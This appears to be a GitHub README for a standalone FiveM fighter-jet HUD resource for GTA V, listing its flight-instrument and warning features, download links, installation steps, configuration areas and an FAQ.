# FighterJet HUD v2 - Game Script Utility 2026

> A self-contained FiveM aircraft HUD for GTA V fighter jets, created to swap out the stock cockpit display for flight instruments, weapon state, and warning alerts.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-FiveM-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/masonio21/fighterjet-hud-v2-script?style=flat-square)](https://github.com/masonio21/fighterjet-hud-v2-script)

---

<p align="center">
  <a href="https://masonio21.github.io/fighterjet-hud-v2-script/">
    <img src="https://img.shields.io/badge/Download-FighterJet%20HUD%20Script-brightgreen?style=for-the-badge" alt="Download FighterJet HUD Script">
  </a>
</p>

> **[Direct Download - FighterJet HUD](https://masonio21.github.io/fighterjet-hud-v2-script/)**

---

[Download Latest Build](https://masonio21.github.io/fighterjet-hud-v2-script/)

---

## What it does

FighterJet HUD is a FiveM resource built for GTA V aircraft, with a focus on a fighter-jet cockpit presentation. Instead of the default vanilla HUD, it provides a custom layout that surfaces flight telemetry, weapon prompts, and threat alerts in a more aviation-centric format.

The script is intended to run on its own, without framework requirements, so it can be added to a FiveM server and adjusted per aircraft. Theme options and vehicle-specific tuning are included as well, which helps tailor the display to different jet models and loadouts.

## Features

- Swaps the GTA V default cockpit HUD for a fighter-jet style interface
- Shows speed, altitude, heading, pitch, roll, and FPM data
- Presents weapon reticles plus a named weapon annunciator
- Monitors lock and targeting states with audio feedback
- Provides a radar warning receiver with directional threat detection
- Outputs real-time synthesized cockpit sounds through the browser layer
- Allows per-vehicle configuration for aircraft models and theme colors
- Operates as a standalone FiveM resource with no framework dependencies

## Installation

1. Download the latest build from the project page.
2. Put the resource folder into your FiveM resources directory.
3. Keep or rename the folder as needed, for example:
   fighterjet-hud-western
4. Register the resource in your server config:
   ensure fighterjet-hud-western
5. Restart the server or refresh resources to load the HUD.

If your server relies on custom aircraft or weapon mappings, tweak the resource settings so the HUD reflects the vehicle model and weapon behavior you want.

## Configuration

Common adjustment points include vehicle matching, theme colors, and warning behavior. The exact setting names can differ between releases, but the resource is meant to support aircraft-specific tuning.

| Setting Area | Purpose | Common Use |
| --- | --- | --- |
| Vehicle model mapping | Assign HUD behavior to specific jets | Match display logic to a given aircraft |
| Theme color | Change the visual accent color | Adapt the HUD to a server style |
| Weapon annunciator | Control weapon label display | Show the active weapon name |
| RWR behavior | Tune threat detection output | Adjust warning presentation |
| Audio cues | Enable cockpit sound feedback | Reflect lock or targeting states |
| NUI display | Manage the interface layer | Control how the HUD is rendered |

## Compatibility

FighterJet HUD is made for FiveM and GTA V aircraft scenarios. It targets fighter-jet gameplay and depends on the vehicle and weapon setup available on the server.

Known considerations:

- Built for GTA V aircraft, not ground vehicles
- Visual behavior varies with the aircraft model and configured weapon systems
- Some HUD elements may need matching vehicle definitions to operate as expected
- Because it is standalone, it does not use framework-specific integrations

## FAQ

### How do I install it?
Download the archive, place the resource folder in your FiveM resources directory, and add an `ensure` line to your server configuration.

### Can I customize the look?
Yes. The profile supports theme color configuration and per-vehicle tuning, so you can adapt the HUD for different aircraft or server branding.

### Does it work without a framework?
Yes. It is described as a standalone FiveM resource with no framework dependencies.

### What game is it for?
It is intended for GTA V aircraft use inside FiveM.

### Can I use it with different jets?
Yes. The resource is organized around per-vehicle model configuration, so separate fighter aircraft can be mapped individually.

### Where are the sounds handled?
Cockpit sound playback is handled through the browser-based UI layer, using synthesized audio behavior.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
